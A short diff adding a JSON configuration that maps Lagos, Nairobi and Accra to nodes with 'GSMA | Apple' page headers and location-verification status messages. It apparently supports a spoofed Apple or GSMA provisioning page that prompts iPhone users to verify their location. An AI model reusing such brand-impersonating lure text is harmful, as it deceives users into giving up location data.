@@ -1,0 +1,20 @@
+{
+  "lagos": {
+    "node": "LAGOS_CENTRAL_3",
+    "country": "NG",
+    "header": "GSMA | Apple Enterprise Provisioning",
+    "status": "WAITING FOR LOCATION VERIFICATION..."
+  },
+  "nairobi": {
+    "node": "NAIROBI_EAST_2",
+    "country": "KE",
+    "header": "GSMA | Apple Device Services",
+    "status": "iPhone Status Pending Location..."
+  },
+  "accra": {
+    "node": "ACCRA_WEST_1",
+    "country": "GH",
+    "header": "GSMA | Secure iPhone Link",
+    "status": "Verify Location for Provisioning"
+  }
+}
